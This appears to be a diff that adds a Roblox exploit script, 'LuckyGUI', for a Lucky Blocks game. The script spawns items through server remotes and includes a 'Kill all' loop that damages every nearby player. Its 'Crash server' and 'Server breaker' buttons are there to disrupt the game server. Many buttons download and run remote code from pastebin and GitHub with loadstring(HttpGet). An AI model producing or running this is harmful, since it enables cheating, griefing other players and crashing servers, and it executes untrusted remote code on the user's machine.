@@ -1,0 +1,281 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "LuckyGUI", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+	Name = "Lucky blocks",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Lucky block",
+	Callback = function()
+      		game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Super block",
+	Callback = function()
+      		game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Diamond block",
+	Callback = function()
+      		game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Rainbow block",
+	Callback = function()
+      		game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Galaxy block",
+	Callback = function()
+      		game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Get all weapons",
+	Callback = function()
+      		for i = 1, 30 do
+game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
+game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
+game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
+game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
+end
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "PVP",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Kill all",
+	Callback = function()
+      		
+local range = 1000
+
+local player = game:GetService("Players").LocalPlayer
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    local p = game.Players:GetPlayers()
+    for i = 2, #p do local v = p[i].Character
+        if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and player:DistanceFromCharacter(v.HumanoidRootPart.Position) <= range then
+            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+            if tool and tool:FindFirstChild("Handle") then
+                tool:Activate()
+                for i,v in next, v:GetChildren() do
+                    if v:IsA("BasePart") then
+                        firetouchinterest(tool.Handle,v,0)
+                        firetouchinterest(tool.Handle,v,1)
+                    end
+                end
+            end
+        end
+    end
+end)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Equip tools",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/gR4Zki4n"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Drop tools",
+	Callback = function()
+      		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
+   if v:IsA("Tool")  then
+    wait(0.1)
+    v.Parent = game.Players.LocalPlayer.Character
+    wait(0.1)
+    v.Parent = game.Workspace
+end
+end
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Multi gear",
+	Callback = function()
+      		lp = game:GetService("Players").LocalPlayer
+
+game:GetService("UserInputService").InputBegan:Connect(function(key)
+	if key.KeyCode == Enum.KeyCode.E then
+		for i,tool in pairs(lp.Backpack:GetChildren()) do
+			if tool:IsA("Tool") then
+				tool.Parent = lp.Character
+				tool:Activate()
+				task.wait()
+				tool.Parent = lp.Backpack
+			end
+		end
+	end
+end)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Reach sword",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/wyXt5xmu"))()
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "GUIS",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Why do you need others if you have me?"
+})
+
+Tab:AddButton({
+	Name = "Proxima hub",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Noob hub",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/NOOBHUBX/LUCKY-BLOCKS/main/NOOB%20HUB.Lua", true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Lucky block HUB",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/09NZMs4E"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Sky hub",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/arlists/Sky-Hub/main/Main", true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Harlen hub",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/harlenscripts/HarlenHub/main/HarlenScripts"))()
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Crash server",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/AnonTheEgg/rutv2nh4586tyun2v498v5uc9v2g84vun5/main/kksjednfkjqebfjkabsdjhfbqwef",true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Keyboard",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "I see you everywhere",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/daM0ut53"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Endless zoom",
+	Callback = function()
+      		plr.CameraMaxZoomDistance = 1e99
+plr.CameraMinZoomDistance = 0
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Console button",
+	Callback = function()
+      		local Console = Instance.new("ScreenGui")
+Console.Name = 'Console'
+Console.Parent = game.CoreGui
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 32, 0, 32)
+button.Position = UDim2.new(0, 105, 0, -32)
+button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+button.BackgroundTransparency = 0.5
+button.Text = "< >"
+button.TextColor3 = Color3.fromRGB(200, 200, 200)
+button.Parent = Console
+button.Font = 'Code'
+button.TextSize = 12
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = button
+
+button.MouseButton1Click:Connect(function()
+    game:GetService("VirtualInputManager"):SendKeyEvent(true, "F9" , false , game)
+end)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Fling punch",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling",true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Server breaker",
+	Callback = function()
+      		game:GetService("CoreGui").PurchasePrompt.Enabled = false
+_G.Lag = true
+while _G.Lag do
+for i,v in pairs(workspace:GetDescendants()) do
+   if v:IsA("ClickDetector") then
+    fireclickdetector(v)
+   end
+end
+  wait(1)
+  end
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Touch all",
+	Callback = function()
+      		local plr = game.Players.LocalPlayer.Character.Head
+for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
+        if v.Name == "TouchInterest" and v.Parent then
+        firetouchinterest(plr, v.Parent, 0)
+    end
+end
+  	end    
+})
